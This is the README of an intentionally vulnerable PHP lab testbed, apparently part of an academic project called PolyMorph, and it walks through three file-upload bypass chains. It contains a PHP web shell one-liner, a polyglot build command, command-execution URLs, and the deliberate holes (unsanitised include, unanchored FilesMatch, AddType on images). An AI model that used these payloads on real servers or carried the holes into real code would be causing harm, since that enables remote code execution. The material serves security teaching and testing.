# PolyMorph Security Research — Tier 1 Legacy PHP Testbed

> **⚠️ DISCLAIMER — READ BEFORE USE ⚠️**
>
> **THIS ENVIRONMENT IS INTENTIONALLY VULNERABLE.**
> It is designed exclusively for **academic security research** and
> **controlled local lab demonstrations** as part of the PolyMorph project.
>
> **DO NOT deploy to any public server, cloud instance, or shared network.**
> **DO NOT expose port 8081 beyond localhost.**
> The authors accept no liability for misuse of this environment.

---

## Overview

This testbed simulates a realistic but deliberately weakened PHP profile-page application. It demonstrates three file-upload bypass vulnerability chains commonly found in legacy PHP codebases.

| Component | Technology |
|---|---|
| Runtime | PHP 8.1 + Apache (mod_php) |
| UI | Bootstrap 5 |
| Container | Docker / docker-compose |
| Port | `8081` (localhost only) |

---

## Quick Start

```bash
# From the tier1_legacy/ directory:
docker compose up --build
```

Application is available at: **http://localhost:8081**

To stop and remove containers:

```bash
docker compose down
```

---

## Attack Vectors

### Vector 1 — Magic-Byte Bypass → LFI (PHP `include`)

**Mechanism:** Upload a JPEG+PHP polyglot. `exif_imagetype()` passes because the
file starts with valid JPEG magic bytes (`FF D8 FF`). When the LFI sink calls
`include($page)`, PHP scans for `<?php` tags inside the binary blob and executes
the embedded code.

**Step-by-step:**

1. Generate a JPEG+PHP polyglot with PolyMorph:
   ```bash
   python -m PolyMorph build jpeg \
       --inject "<?php system(\$_GET['cmd']); ?>" \
       --output avatar.jpg
   ```

2. Upload `avatar.jpg` via the **Upload Profile Photo** form at
   `http://localhost:8081`.

3. Trigger the LFI:
   ```
   http://localhost:8081/?page=uploads/avatar.jpg&cmd=id
   ```

**Why it works:**
- `exif_imagetype()` only inspects magic bytes — passes ✅
- PHP's `include()` does not validate file type; it executes any `<?php ?>` block
  it finds, regardless of surrounding binary data ✅

---

### Vector 2 — Apache `.htaccess` Handler Misconfiguration

**Mechanism:** Apache honours per-directory `.htaccess` files. If an attacker can
write a crafted `.htaccess` into the `uploads/` directory, they can instruct
Apache to treat image files as PHP scripts.

**Step-by-step:**

1. Copy the pre-made vulnerable config into the uploads folder:
   ```bash
   # From inside the container:
   docker exec polymorph_tier1_php \
       cp /var/www/html/uploads/.htaccess_vulnerable \
          /var/www/html/uploads/.htaccess
   ```
   Or, if you have direct filesystem access (volume mount):
   ```bash
   copy backend\uploads\.htaccess_vulnerable backend\uploads\.htaccess
   ```

2. Request the uploaded image directly (no LFI needed):
   ```
   http://localhost:8081/uploads/avatar.jpg?cmd=whoami
   ```

**Why it works:**
```apache
AddType application/x-httpd-php .jpg .png .gif
```
Apache's `AddType` directive causes mod_php to process every `.jpg` file in
that directory as a PHP script. The embedded `<?php system($_GET['cmd']); ?>`
is executed server-side.

---

### Vector 3 — Double Extension Bypass

**Mechanism:** Apache's misconfigured `FilesMatch` regex lacks a `$` anchor,
so a file named `avatar.php.jpg` matches `\.php` and is handed to mod_php.

**Step-by-step:**

1. Create a PHP shell with a double extension:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > avatar.php.jpg
   ```

2. Upload `avatar.php.jpg` via the web UI. The upload handler only checks the
   final extension (`jpg`), so it passes.

3. Request the file directly:
   ```
   http://localhost:8081/uploads/avatar.php.jpg?cmd=uname+-a
   ```

**Why it works:**
The Dockerfile injects this intentionally broken `FilesMatch` directive:
```apache
<FilesMatch "\.php">
    SetHandler application/x-httpd-php
</FilesMatch>
```
Because the pattern is `\.php` (no `$`), `avatar.php.jpg` matches and Apache
routes it to the PHP interpreter.

---

## File Structure

```
tier1_legacy/
├── docker-compose.yml
├── README.md
└── backend/
    ├── Dockerfile
    ├── index.php          ← Profile page + LFI sink (?page=)
    ├── upload.php         ← Weak upload handler
    ├── view_profile.php   ← Redirect shim
    └── uploads/
        ├── .htaccess              ← Safe default (no PHP execution)
        └── .htaccess_vulnerable   ← Vector 2 payload (rename to .htaccess)
```

---

## Intentional Weaknesses Summary

| # | File | Weakness |
|---|---|---|
| W1 | `upload.php` | Extension-only check — bypassable with double extension |
| W2 | `upload.php` | `exif_imagetype()` accepts JPEG+PHP polyglots |
| W3 | `upload.php` | Files saved to webroot with original filename |
| W4 | `index.php` | `include($_GET['page'])` with no sanitisation (LFI) |
| W5 | `Dockerfile` | `FilesMatch "\.php"` without `$` anchor (double extension) |
| W6 | `uploads/.htaccess_vulnerable` | `AddType` makes images executable as PHP |

---

*PolyMorph Security Research Project — Academic Use Only*
